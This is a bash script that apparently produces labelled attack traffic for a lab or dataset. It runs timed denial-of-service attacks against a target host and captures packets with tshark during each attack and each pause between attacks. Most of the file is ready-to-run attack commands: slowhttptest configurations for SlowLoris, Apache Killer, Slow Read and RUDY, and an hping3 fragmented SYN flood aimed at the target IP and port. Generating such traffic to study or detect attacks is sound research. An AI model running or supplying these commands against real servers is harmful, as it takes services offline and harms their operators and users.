#!/bin/bash

#Import variables from file
source variables.sh

#Define variables for whole attack
attack_procedure_log="/home/logs/attack_procedure.log"

attack(){
    #Write to file
    echo "Started "$1" attack" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

    #Run the attack
    ./attack.sh $1 $2 $3 $4 $5 $6 $7 $8 "$9"

    #Write to file
    echo "$1 attack is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
}
#Write to file
echo "Started break 1" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Start Wireshark capture
tshark -i $interface -w "/home/wiresharkTraces/Break1.pcap" -F pcap & pid_tshark=$!
sleep $((3*60)) # in seconds


#Wait for next attack
sleep $((10*60))
#Stop the Wireshark capture
kill "$pid_tshark"
#Write to file
echo "Break 1 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log

#Define variables for attack 2
attack_type="SlowLoris"
capture_file="/home/wiresharkTraces/SlowLoris.pcap"
traceroute_log="/home/logs/SlowLoris_traceroute.log"
attack_stats_log="/home/logs/SlowLoris_stats.log"
attack_log="/home/logs/SlowLoris.log"
attack_duration=$((9*60)) # in seconds
destination_ip=$machine13_ip
destination_port=$machine13_port
attack_script="slowhttptest -c 1000 -H -g -i 10 -r 200 -u http://"$destination_ip" -x 24 -p 3"

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"

#Write to file
echo "Started break 2" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Start Wireshark capture
tshark -i $interface -w "/home/wiresharkTraces/Break2.pcap" -F pcap & pid_tshark=$!
#Wait for next attack
sleep $((6*60))
#Stop the Wireshark capture
kill "$pid_tshark"
#Write to file
echo "Break 2 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 7
attack_type="apacheKiller"
capture_file="/home/wiresharkTraces/apacheKiller.pcap"
traceroute_log="/home/logs/apacheKiller_traceroute.log"
attack_stats_log="/home/logs/apacheKiller_stats.log"
attack_log="/home/logs/apacheKiller.log"
attack_duration=$((16*60)) # in seconds
destination_ip=$machine13_ip
destination_port=$machine13_port
attack_script="slowhttptest -R -g -c 1000 -a 10 -b 3000 -r 500 -t HEAD  -u http://"$destination_ip""

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"

#Write to file
echo "Started break 3" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Start Wireshark capture
tshark -i $interface -w "/home/wiresharkTraces/Break3.pcap" -F pcap & pid_tshark=$!
#Wait for next attack
sleep $((15*60))
sleep $((5*60)) # in seconds

#Wait for next attack
sleep $((7*60))
#Stop the Wireshark capture
kill "$pid_tshark"
#Write to file
echo "Break 3 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 9
attack_type="slowRead"
capture_file="/home/wiresharkTraces/slowRead.pcap"
traceroute_log="/home/logs/slowRead_traceroute.log"
attack_stats_log="/home/logs/slowRead_stats.log"
attack_log="/home/logs/slowRead.log"
attack_duration=$((13*60)) # in seconds
destination_ip=$machine13_ip
destination_port=$machine13_port
attack_script="slowhttptest -c 1000 -X -g -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://"$destination_ip" -p 3"

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"

#Write to file
echo "Started break 4" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Start Wireshark capture
tshark -i $interface -w "/home/wiresharkTraces/Break4.pcap" -F pcap & pid_tshark=$!
#Wait for next attack
sleep $((14*60))

sleep $((10*60)) # in seconds

#Wait for next attack
sleep $((3*60))
#Stop the Wireshark capture
kill "$pid_tshark"
#Write to file
echo "Break 4 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 1
attack_type="TCP_SYN_Flood"
capture_file="/home/wiresharkTraces/SYN.pcap"
traceroute_log="/home/logs/SYN_traceroute.log"
attack_stats_log="/home/logs/SYN_stats.log"
attack_log="/home/logs/SYN_attack.log"
attack_duration=$((7*60)) # in seconds
destination_ip=$machine13_ip
destination_port=$machine13_port
attack_script="hping3 --flood --frag -p "$destination_port" -S $destination_ip"

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"

#Write to file
echo "Started break 5" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log
#Start Wireshark capture
tshark -i $interface -w "/home/wiresharkTraces/Break5.pcap" -F pcap & pid_tshark=$!
#Wait for next attack
sleep $((20*60))
#Stop the Wireshark capture
kill "$pid_tshark"
#Write to file
echo "Break 5 is finished" | ts "[%b %d %H:%M:%.S]" | tee -a $attack_procedure_log


#Define variables for attack 4
attack_type="RUDY"
capture_file="/home/wiresharkTraces/RUDY.pcap"
traceroute_log="/home/logs/RUDY_traceroute.log"
attack_stats_log="/home/logs/RUDY_stats.log"
attack_log="/home/logs/RUDY.log"
attack_duration=$((9*60)) # in seconds
destination_ip=$machine13_ip
destination_port=$machine13_port
attack_script="slowhttptest -c 1000 -B -g -i 100 -r 200 -s 8192 -u http://"$destination_ip" -x 10 -p 3"

attack $attack_type $capture_file $traceroute_log $attack_stats_log $attack_log $attack_duration $destination_ip $destination_port "$attack_script"